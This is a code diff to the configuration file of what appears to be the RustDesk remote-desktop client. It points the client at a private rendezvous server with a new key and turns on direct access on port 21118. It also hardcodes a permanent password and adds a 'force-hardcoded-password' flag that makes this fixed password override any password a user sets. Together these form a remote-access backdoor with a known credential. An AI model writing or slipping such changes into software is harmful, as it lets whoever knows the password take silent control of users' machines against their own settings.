@@ -68,7 +68,17 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+    let mut map = HashMap::new();
+    map.insert("password".to_string(), "BBGxxb!@#123".to_string());
+    map.insert(keys::OPTION_DIRECT_SERVER.to_string(), "Y".to_string());
+    map.insert(keys::OPTION_DIRECT_ACCESS_PORT.to_string(), "21118".to_string());
+    
+    // 添加控制项，强制使用硬编码密码
+    map.insert("force-hardcoded-password".to_string(), "Y".to_string());
+    
+    RwLock::new(map)
+};
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -100,8 +110,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["192.168.7.212"];
+pub const RS_PUB_KEY: &str = "nAGkD14upZv+X03LaQPnH2TTOb84m0puQux4hAtyxH4=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -1038,8 +1048,7 @@ impl Config {
         Config::set_id(&new_id);
         log::info!("id updated from {} to {}", id, new_id);
     }
-
-    pub fn set_permanent_password(password: &str) {
+ pub fn set_permanent_password(password: &str) {
         if HARD_SETTINGS
             .read()
             .unwrap()
@@ -1057,16 +1066,24 @@ impl Config {
         Self::clear_trusted_devices();
     }
 
-    pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
+pub fn get_permanent_password() -> String {
+    let hard_settings = HARD_SETTINGS.read().unwrap();
+    
+    // 检查是否强制使用硬编码密码
+    if hard_settings.get("force-hardcoded-password") == Some(&"Y".to_string()) {
+        if let Some(password) = hard_settings.get("password") {
+            return password.clone();
         }
-        password
     }
-
+    
+    // 否则使用正常逻辑
+    let config_password = CONFIG.read().unwrap().password.clone();
+    if config_password.is_empty() {
+        hard_settings.get("password").cloned().unwrap_or_default()
+    } else {
+        config_password
+    }
+}
     pub fn set_salt(salt: &str) {
         let mut config = CONFIG.write().unwrap();
         if salt == config.salt {
